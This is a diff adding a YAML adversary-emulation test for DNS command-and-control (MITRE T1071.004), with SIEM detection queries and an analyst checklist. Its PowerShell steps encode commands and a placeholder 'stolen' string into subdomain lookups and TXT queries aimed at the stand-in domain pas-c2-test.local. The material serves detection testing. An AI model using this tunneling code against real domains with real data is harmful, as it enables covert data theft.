@@ -1,0 +1,116 @@
+id: T1071.004_application_layer_dns
+name: "Application Layer Protocol — DNS"
+mitre_technique: "T1071.004"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries use DNS queries as a C2 channel — encoding commands in TXT record
+  responses and exfiltrating data as subdomains of the C2 domain. DNS traffic is
+  rarely blocked, often not inspected for content, and almost always allowed through
+  firewalls. Tools like dnscat2, iodine, and custom implants use DNS tunneling.
+  Detection relies on: high query volume per domain, long subdomain labels, TXT record
+  queries to non-business domains, and DNS query entropy analysis.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1071/004/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1071.004 — DNS C2 channel simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate DNS tunneling — data encoded in subdomain labels of C2 domain"
+    command: |
+      Write-Host "[PAS] Simulating DNS tunnel C2 — data encoded in subdomain queries:"
+      $c2Domain = "pas-c2-test.local"
+
+      # Encode data as hex in subdomain labels (real dnscat2 pattern)
+      $commands = @("whoami", "ipconfig", "net user")
+      foreach ($cmd in $commands) {
+          $encoded  = [System.BitConverter]::ToString(
+              [System.Text.Encoding]::UTF8.GetBytes($cmd)) -replace '-',''
+          $subdomain = "$encoded.$c2Domain"
+          Write-Host "[PAS] DNS query (data-as-subdomain): $subdomain"
+          try {
+              [System.Net.Dns]::GetHostAddresses($subdomain) | Out-Null
+          } catch {}
+      }
+      Write-Host "[PAS] DNS tunnel queries generated — high-entropy subdomain pattern"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate DNS TXT record C2 — commands delivered in TXT response"
+    command: |
+      Write-Host "[PAS] Simulating TXT record C2 polling:"
+      # nslookup TXT query generates distinct DNS query type telemetry
+      $queries = @(
+          "nslookup -type=TXT beacon.pas-c2-test.local 127.0.0.1",
+          "nslookup -type=TXT cmd.pas-c2-test.local 127.0.0.1",
+          "nslookup -type=TXT stage2.pas-c2-test.local 127.0.0.1"
+      )
+      foreach ($q in $queries) {
+          Start-Process cmd.exe -ArgumentList "/c $q" -Wait -NoNewWindow `
+              -RedirectStandardOutput "$env:TEMP\PAS_T1071_004_dns.txt" `
+              -ErrorAction SilentlyContinue
+          Write-Host "[PAS] TXT query: $q"
+      }
+      Write-Host "[PAS] DNS TXT query telemetry generated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate high-volume DNS exfiltration — burst of queries encoding stolen data"
+    command: |
+      Write-Host "[PAS] Simulating DNS exfiltration burst (data encoded in subdomains):"
+      $stolen = "PAS-T1071-004-SENSITIVE-DATA-SIMULATED"
+      $chunks = [System.Text.RegularExpressions.Regex]::Split(
+          [System.BitConverter]::ToString(
+              [System.Text.Encoding]::UTF8.GetBytes($stolen)) -replace '-','',
+          "(?<=\G.{30})")  # 30 chars per label
+
+      $seq = 0
+      foreach ($chunk in $chunks | Where-Object { $_ }) {
+          $query = "$seq.$chunk.exfil.pas-c2-test.local"
+          try { [System.Net.Dns]::GetHostAddresses($query) | Out-Null } catch {}
+          Write-Host "[PAS] Exfil chunk $seq : $query"
+          $seq++
+      }
+      Write-Host "[PAS] DNS exfil burst complete — $seq queries generated"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — high volume DNS queries to same domain, long/high-entropy subdomain labels, TXT record queries"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove DNS query output file"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1071_004_dns.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] DNS output file removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1071.004 cleanup complete"
+
+analyst_checklist:
+  - "DNS event: high volume queries to single domain (>50 queries/min) — tunneling indicator"
+  - "DNS event: subdomain labels >50 characters or high Shannon entropy — encoded data"
+  - "DNS event: TXT record queries to non-business domains from endpoints"
+  - "DNS event: nslookup.exe with -type=TXT argument spawned from powershell.exe"
+  - "Sentinel: DnsEvents | where Name endswith 'pas-c2-test.local' | summarize count() by Name | where count_ > 10"
+  - "Sentinel: DnsEvents | where strlen(Name) > 60 — long subdomains indicate tunneling"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'nslookup.exe' and ProcessCommandLine contains 'TXT'"
+  - "MDE alert: 'DNS tunneling activity' or 'High volume DNS queries to single domain'"
+  - "CONTROL CHECK: DNS-layer security (Defender for DNS, Umbrella) — inspect DNS query content, not just domain reputation"
+  - "CONTROL CHECK: Block DNS TXT queries from endpoints to external resolvers — most environments have no legitimate need"
